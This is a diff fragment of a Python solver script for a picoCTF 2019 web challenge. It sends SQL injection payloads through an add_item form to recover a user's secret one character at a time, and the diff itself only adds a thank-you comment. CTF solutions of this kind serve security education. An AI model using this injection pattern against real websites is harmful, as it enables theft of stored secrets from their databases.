@@ -126,7 +126,7 @@ if len(result) > 0:
             result[idx] = {'hex':res,'possible_values':[bytearray.fromhex(res + ch).decode() for ch in a_to_f]}
             for k in result[idx]["possible_values"]:
               print(f"Testing {idx} for {k}...")
-              my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT (substr(secret,{idx+1},1)='{k}')  FROM user where id='3') +'"})
+              my_session.post('https://2019shell1.picoctf.com/problem/27357/add_item',data={'csrf_token':csrf,'item':f"'+ (SELECT (substr(secret,{idx+1},1)='{k}')  FROM user where id='3') +'"}) #thanks Gynvael for shifting approach
               item_list = my_session.get('https://2019shell1.picoctf.com/problem/27357/list_items')
               soup2 = BeautifulSoup(item_list.text,'html.parser')
               item = [ item.next_sibling.strip('  \n\t') for item in soup2.find_all('strong')][-1]
